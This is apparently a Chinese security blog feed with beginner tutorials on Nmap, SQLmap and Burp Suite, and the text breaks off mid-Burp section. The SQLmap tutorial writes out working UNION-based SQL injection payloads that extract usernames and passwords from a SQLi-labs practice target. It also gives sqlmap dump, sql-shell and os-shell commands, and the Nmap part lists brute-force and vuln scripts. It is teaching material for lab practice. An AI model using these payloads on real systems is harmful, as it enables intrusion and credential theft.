返回的是存活的IP</em></strong></p><p>如：<code>nmap  -sP 192.168.8.105</code><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508170425590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>8）扫描目标地址操作系统版本、服务器版本  -O  -sV</em></strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508162914334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508163225645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>9）对目标地址进行路由跟踪  –traceroute</em></strong></p><p>如：<code>nmap  --traceroute   192.168.8.105</code><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508163905813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><strong><em>10）扫描文件内的IP地址   -iL</em></strong></p><p>namp -iL  本地文件地址<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508164821868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508164727142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><strong><em>11）扫描除某一文件中的目标地址之外的目标地址   -excludefile</em></strong></p><p>如：<code>nmap  192.68.8.100-105   -excludefile   地址</code><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508165917462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200508165945136.png" alt=""><br>在这里，我们发现在ip文本中的192.168.5.108被排除扫描了</p><h1 id="04-Nmap拓展应用"><a href="#04-Nmap拓展应用" class="headerlink" title="04 Nmap拓展应用"></a>04 Nmap拓展应用</h1><p>大家可以自行尝试</p><p>1）暴力破解攻击  buute</p><pre class=" language-powershell"><code class="language-powershell">nmap  <span class="token operator">--</span>script=brute 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>8<span class="token punctuation">.</span>105</code></pre><p>2）常见漏洞扫描  vuln</p><pre class=" language-powershell"><code class="language-powershell">nmap  <span class="token operator">--</span>script=vuln 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>8<span class="token punctuation">.</span>105</code></pre><p>3）探测开启服务  broadcast</p><pre class=" language-powershell"><code class="language-powershell">nmap  <span class="token operator">--</span>script=broadcast 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>8<span class="token punctuation">.</span>105</code></pre><p><br><br><br><br>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616062636626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基础使用Sqlmap进行测试？你不得不掌握的基础知识</title>
      <link href="/2020/07/20/ling-ji-chu-shi-yong-sqlmap-jin-xing-ce-shi-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/"/>
      <url>/2020/07/20/ling-ji-chu-shi-yong-sqlmap-jin-xing-ce-shi-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p><font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font></p><p><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 Sqlmap是用来干什么的？</p><p>02 手工注入测试SQL注入漏洞的过程？</p><p>03 使用Sqlmap测试SQL注入漏洞的过程？</p><p>04 使用Sqlmap有什么心得？<br></p><p>@<a href="为方便您的阅读，可戳下方蓝字，快速跳转">TOC</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615202501650.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-Sqlmap的用途"><a href="#01-Sqlmap的用途" class="headerlink" title="01 Sqlmap的用途"></a>01 Sqlmap的用途</h1><p>如果大家有听过SQL注入漏洞，那么简单来说，<strong>SQLmap便是自动化SQL注入漏洞工具</strong>。</p><p>Sqlmap是专门用于对付网站数据库的利器，<font color='red'>不仅可以对数据库进行指纹识别、读取文件、提取数据等操作，在获取管理员权限情况下，甚至可以对数据库进行删库操作，为所欲为！</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061520251259.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>可能从以上的描述，大家还不能理解Sqlmap这个工具的厉害之处。</p><p><font color='blue'> 那么接下来，我就以同一个漏洞场景，分别从手工测试和Sqlmap工具层面进行测试，让大家见识见识Sqlmap的厉害。 </font></p><p>（为安全起见，不公开搭建的靶场，以下测试环境中<strong>以xx.xx.xx.xx代替真实IP地址</strong>）<br><br><br></p><h1 id="02-手工SQL注入漏洞"><a href="#02-手工SQL注入漏洞" class="headerlink" title="02 手工SQL注入漏洞"></a>02 手工SQL注入漏洞</h1><p>这里举一个SQL注入漏洞的栗子：</p><p><font color='red'> 通过Union注入获取后台数据库的user表中对应的用户名及密码信息： </font></p><p>1.在疑似注入页面的网站:<a href="http://47.107.79.22:83/Less-1中，通过**添加单引号**判断是否存在注入点" target="_blank" rel="noopener external nofollow noreferrer">http://47.107.79.22:83/Less-1中，通过**添加单引号**判断是否存在注入点</a></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182614393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>'</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182636529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><p>根据以上测试，发现数字1后<strong>添加单引号之后再次请求页面， 页面返回信息不同</strong>  初步判断存在SQL注入漏洞，且页面返回数据库信息的 ，<font color='red'> 针对性采用union注入攻击</font></p><br>2.判断该页面的字段数<pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>' order by  <span class="token number">3</span> <span class="token operator">--</span></code></pre><p><font color='red'> （注意：– 两个横杠一个空格是mysql中的注释符，用于注释注入语句之后的语句）</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061518265755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>' order by  <span class="token number">4</span> <span class="token operator">--</span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182707962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>我们发现当输入字段数为3时，页面信息无误，<strong>而输入字段数为4时，页面返回信息出错</strong>。</p><p>因此我们<strong>判断页面字段数为3</strong><br><br><br>3.<strong>查看页面回显点</strong></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union  select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>  <span class="token operator">--</span></code></pre><p><font color='red'> （注意：这里要把1改成-1，原因是当用id=1的时候执行的结果只有一条记录，所以我们要让union左边的select子句查询结果为空，这样页面就会回显union右边的查询结果） </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182722702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>观察页面，2,3数字位置为回显点，我们可以<strong>通过该回显点来获取数据库名、数据表名等关键信息</strong><br><br><br>4.查看<strong>数据库</strong></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union  select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">--</span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182756421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>我们获取到数据库名为：<strong>security</strong></p><p>之所以我们能够查询到数据库名，是因为<strong>mysql数据库的特殊性。</strong></p><p>在mysql数据库中，<strong>information_schema</strong>是系统数据库，安装完就有，记录内容是当前数据库的数据库，表，列，用户权限等信息，以下是该数据库中的三张数据表：<br>表名    | 含义<br>——– | —–<br>SCHEMATA表  |储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。<br>TABLES表* | 储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表<br>COLUMNS表  | 提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</p><br>5.查看数据表<pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union  select 1,2,(select table_name from  information_schema.tables where  table_schema = '</span>security'  limit  <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">--</span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182844981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>我们得知有个数据表名是<strong>users</strong>。</p><br><p>6.查看<strong>对应数据</strong></p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">:</span><span class="token number">83</span><span class="token operator">/</span>Less<span class="token number">-1</span><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span><span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span><span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token operator">--</span></code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182904494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>以上测试用到的函数：</p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>concat_ws（）</td><td>从数据库里取N个字段，然后组合到一起用符号分割显示，第一个参数剩余参数间的分隔符</td></tr><tr><td>char（）</td><td>将十进制ASCII码转化成字符</td></tr><tr><td>user（）</td><td>返回当前数据库连接使用的用户</td></tr><tr><td>database（）</td><td>返回当前数据库连接使用的数据库</td></tr><tr><td>version（）</td><td>返回当前数据库的版本</td></tr></tbody></table><p><br><br></p><h1 id="03-使用Sqlmap的方法"><a href="#03-使用Sqlmap的方法" class="headerlink" title="03 使用Sqlmap的方法"></a>03 使用Sqlmap的方法</h1><p>一般情况下，我们利用该工具的思路如下:<br><br>1）寻找一个<strong>可能有SQL注入漏洞的网址</strong><br><a href="http://47.107.79.22:83/Less-1/?id=1" target="_blank" rel="noopener external nofollow noreferrer">http://47.107.79.22:83/Less-1/?id=1</a></p><p>2）使用SQLmap，-u参数检测<strong>是否存在注入漏洞</strong>（ 如果网址存在多个参数，这个网址要用双引号包起来）</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182913774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>检测的时候出现的三个问题分别是:<br><br>       1、已检测出可能是某某某数据库，是否跳过其他数据库的检查<br><br>       <img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175243958.png#pic_center" alt=""><br>       2、是否启用对于某某某数据库的所有负载测试<br><br>       <img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175253471.png#pic_center" alt=""><br>       3、已知某参数可能存在注入，是否还有检测其他参数<br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175302888.png#pic_center" alt=""><br>3）–dbs参数   查看数据库</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">--</span>dbs</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061517531658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>4）–tables参数  查看数据表</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">-</span>D security <span class="token operator">--</span>tables</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175325878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>4）–columns参数  查看数据列</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">--</span>columns</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175336803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>5）–dump参数  查看具体内容</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">--</span>dump</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175406183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>注明:为了加强我们检测的力度，每次使用的时候可以使用高等级检测，和伪造referer<br>即每次都加上<br>–level 5    –referer  <a href="http://baidu.com" target="_blank" rel="noopener external nofollow noreferrer">http://baidu.com</a></p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">-</span>D security <span class="token operator">-</span>T users <span class="token operator">--</span>dump <span class="token operator">--</span>level 5    <span class="token operator">--</span>referer  http:<span class="token operator">/</span><span class="token operator">/</span>baidu<span class="token punctuation">.</span>com</code></pre><p>6）在获知数据库名、数据表名、列名的情况下，我们还可以使用自定义SQL语句参数为  –sql-shell</p><pre class=" language-powershell"><code class="language-powershell">sqlmap <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx:83<span class="token operator">/</span>Less<span class="token operator">-</span>1<span class="token operator">/</span>?id=1 <span class="token operator">--</span>sql<span class="token operator">-</span>shell</code></pre><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615182924757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>这里以查询user数据包的所有数据举例<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175530596.png#pic_center" alt=""><br>检索结果如下：</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615175540743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>除此之外，我们还可以通过数据库来进行系统命令注入，<br>参数为   –os-shell，这个大家自行尝试</p><h1 id="04-简单小结"><a href="#04-简单小结" class="headerlink" title="04 简单小结"></a>04 简单小结</h1><p>通过上述手工测试和工具测试的例子，相信大家可以了解到：<font color='blue'>相较于繁琐复杂的手工SQL注入测试，Sqlmap像是给猫插上了翅膀一般，理解一些主要关键字的用法即可上手。</font><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615202532106.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>所以当你遇到可能的SQL注入场景，都可以先来Sqlmap来遛一遛，说不定就有惊喜等着你。</p><p><font color='blue'> <strong>当然，虽说不管白猫黑猫，能抓到耗子的就是好猫。Sqlmap工具在效率上显然是占据优势的，但其也存在其局限性，在某些特定场合并不吃香。而手工注入永远你”最后的武器”，希望大家平时也勤加练习</strong>。</font><br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200615202540304.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><br>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063610298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基础使用Burp Suite进行测试？你不得不掌握的基础知识</title>
      <link href="/2020/07/20/ling-ji-chu-shi-yong-burp-suite-jin-xing-ce-shi-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/"/>
      <url>/2020/07/20/ling-ji-chu-shi-yong-burp-suite-jin-xing-ce-shi-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 BurpSuite究竟是什么？</p><p>02 BurpSuite的<strong>核心功能</strong>是什么？</p><p>03 它可以用来做什么？</p><p>04 我们可以用它做什么？<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610114518168.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><br></p><h1 id="01-BurpSuite简介"><a href="#01-BurpSuite简介" class="headerlink" title="01 BurpSuite简介"></a>01 BurpSuite简介</h1><p>打个比方，BurpSuite可以说是<strong>Web安全工具中的瑞士军刀</strong>、<strong>汽车修理工的修理工具箱</strong>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061011452985.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>具体来说Burp Suite代理工具是<font color='red'>以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务端的返回信息等。</font></p><p>该工具主要拦截HTTP和HTTPS协议的流量，通过拦截，Burp Suite以中间人的方式对客户端的请求数据、服务端的返回信息做各种处理，以达到安全测试的目的</p><p><font color='blue'> 简单来说，它就是一款集成化的测试工具，我们只需要配置一些参数，该工具即可帮我们自动化测试 </font><br><br><br></p><h1 id="02-BurpSuite的核心功能"><a href="#02-BurpSuite的核心功能" class="headerlink" title="02 BurpSuite的核心功能"></a>02 BurpSuite的核心功能</h1><p>对于我进行Web渗透测试来说，常用功能有三块，我做详细介绍，其他模块我做简单介绍</p><h2 id="1、Proxy模块"><a href="#1、Proxy模块" class="headerlink" title="1、Proxy模块"></a>1、Proxy模块</h2><p>最主要就是<strong>拦截、查看、修改</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200610115100397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='blue'> 我打个比方，代理模块就相当于我们收发快递时，经过的一个接收快递的中转站。在这个中转站里，中转站可以对我们发出去的快递进行拦截，或者拆包查看快递物件、甚至掉包包裹里的东西。t </font><br><br><img src="/medias/comment_bg.png" 